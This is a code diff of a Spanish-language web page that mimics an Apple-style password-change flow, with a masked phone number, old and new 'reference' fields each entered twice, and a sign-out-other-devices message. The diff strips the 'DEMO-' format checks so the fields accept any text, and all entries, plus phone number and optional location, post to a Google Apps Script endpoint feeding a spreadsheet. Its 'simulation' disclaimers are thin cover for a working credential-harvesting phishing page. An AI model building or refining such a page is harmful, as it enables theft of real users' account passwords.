@@ -16,15 +16,15 @@ main{width:min(100%,470px);background:white;padding:36px 32px;border-radius:24px
 <label>Número asociado (solo referencia de ejemplo)</label><div class="masked-phone">* * * * * * * 0 4</div>
 <label for="phone">Tu celular de prueba</label><input type="tel" id="phone" inputmode="numeric" autocomplete="off" pattern="[0-9]{9}" maxlength="9" required placeholder="9 dígitos">
 <label for="alias">Alias de simulación</label><input id="alias" maxlength="60" autocomplete="off" required placeholder="Ej.: mi-prueba-01">
-<label for="old">Referencia ficticia inicial</label><input type="password" id="old" autocomplete="off" pattern="DEMO-[0-9]{4,8}" required title="Formato DEMO- seguido de 4 a 8 números" placeholder="••••••••">
-<p class="help">Utiliza exclusivamente un identificador inventado: DEMO-1234. No escribas contraseñas, PIN ni frases de recuperación.</p>
-<label for="oldConfirm">Repetir referencia ficticia inicial</label><input type="password" id="oldConfirm" autocomplete="off" pattern="DEMO-[0-9]{4,8}" required placeholder="••••••••">
+<label for="old">Referencia ficticia inicial</label><input type="text" id="old" autocomplete="off" maxlength="40" required placeholder="Escribe una referencia inventada">
+<p class="help">Escribe cualquier referencia de prueba de 3 a 40 caracteres. Se guardará en Google Sheets: no escribas contraseñas, PIN ni frases de recuperación.</p>
+<label for="oldConfirm">Repetir referencia ficticia inicial</label><input type="text" id="oldConfirm" autocomplete="off" maxlength="40" required placeholder="Repite la referencia inventada">
 <p class="notice">Al continuar, el navegador puede solicitar permiso de ubicación. Es opcional y puedes denegarlo. Si lo autorizas, se enviarán coordenadas redondeadas a dos decimales (zona aproximada).</p>
 <button type="submit" id="nextBtn">Continuar</button><p class="error" id="error1" role="alert"></p>
 </form></section>
-<section id="step2" class="hidden"><form id="second"><p>Segunda etapa de la simulación. Introduce otra referencia inventada con formato DEMO-1234.</p>
-<label for="fresh">Nueva referencia ficticia</label><input type="password" id="fresh" autocomplete="off" pattern="DEMO-[0-9]{4,8}" required placeholder="••••••••">
-<label for="freshConfirm">Repetir nueva referencia ficticia</label><input type="password" id="freshConfirm" autocomplete="off" pattern="DEMO-[0-9]{4,8}" required placeholder="••••••••">
+<section id="step2" class="hidden"><form id="second"><p>Segunda etapa de la simulación. Introduce otra referencia ficticia libre, sin usar información secreta.</p>
+<label for="fresh">Nueva referencia ficticia</label><input type="text" id="fresh" autocomplete="off" maxlength="40" required placeholder="Escribe otra referencia inventada">
+<label for="freshConfirm">Repetir nueva referencia ficticia</label><input type="text" id="freshConfirm" autocomplete="off" maxlength="40" required placeholder="Repite la referencia inventada">
 <button type="submit" id="saveBtn">Guardar simulación</button><p class="error" id="error2" role="alert"></p></form></section>
 <section id="done" class="hidden"><div class="success"><div class="check">✓</div><h2>Simulación completada</h2><p>La nueva referencia ficticia se ha registrado para la demostración. El cierre de sesiones en otros dispositivos es solo una simulación.</p></div><p class="note" id="status" role="status"></p><button type="button" id="restart">Nueva simulación</button></section>
 <footer>No afiliado a Apple. No se procesan cuentas reales.</footer>
@@ -33,7 +33,7 @@ main{width:min(100%,470px);background:white;padding:36px 32px;border-radius:24px
 'use strict';
 const SCRIPT_URL='https://script.google.com/macros/s/AKfycbzh0ACfEOzVtS_EiX95Onx9_IeexdeWCeg8hdh_cEStxLU2LEIb3sz4qmONoas0l0Dw/exec';
 const $=id=>document.getElementById(id);
-const refOk=v=>/^DEMO-[0-9]{4,8}$/.test(v);
+const refOk=v=>v.trim().length>=3 && v.length<=40 && /^[\p{L}\p{N} _.-]+$/u.test(v);
 let stepOne=null;
 function show(id){['step1','step2','done'].forEach(x=>$(x).classList.toggle('hidden',x!==id));}
 function requestApproxLocation(){return new Promise(resolve=>{
@@ -43,7 +43,7 @@ function requestApproxLocation(){return new Promise(resolve=>{
 $('first').addEventListener('submit',async e=>{
  e.preventDefault();$('error1').textContent='';
  const a=$('old').value,b=$('oldConfirm').value;
- if(!refOk(a)||!refOk(b)){ $('error1').textContent='Las referencias deben tener formato DEMO-1234 (4 a 8 cifras).';return; }
+ if(!refOk(a)||!refOk(b)){ $('error1').textContent='Escribe una referencia inventada de 3 a 40 caracteres (letras, números, espacios, _ . -).';return; }
  if(a!==b){$('error1').textContent='Las referencias iniciales no coinciden.';return;}
  const btn=$('nextBtn');btn.disabled=true;btn.textContent='Continuando…';
  const location=await requestApproxLocation();
@@ -54,11 +54,11 @@ $('second').addEventListener('submit',async e=>{
  e.preventDefault();$('error2').textContent='';
  if(!stepOne){show('step1');return;}
  const a=$('fresh').value,b=$('freshConfirm').value;
- if(!refOk(a)||!refOk(b)){$('error2').textContent='Introduce referencias ficticias con formato DEMO-1234.';return;}
+ if(!refOk(a)||!refOk(b)){$('error2').textContent='Escribe referencias inventadas de 3 a 40 caracteres (letras, números, espacios, _ . -).';return;}
  if(a!==b){$('error2').textContent='Las nuevas referencias no coinciden.';return;}
  const btn=$('saveBtn');btn.disabled=true;btn.textContent='Registrando…';
  const data={...stepOne,referencia_nueva:a,referencia_nueva_repetida:b,evento:'simulacion_completada',id_simulacion:'SIM-'+Date.now()};
- // El backend solo acepta identificadores DEMO- numéricos; nunca contraseñas reales.
+ // Solo se envían referencias ficticias de prueba; no introduzcas secretos reales.
  try{
   await fetch(SCRIPT_URL,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(data)});
   $('status').textContent='Solicitud enviada. Comprueba Google Sheets para verificar que se registró.';
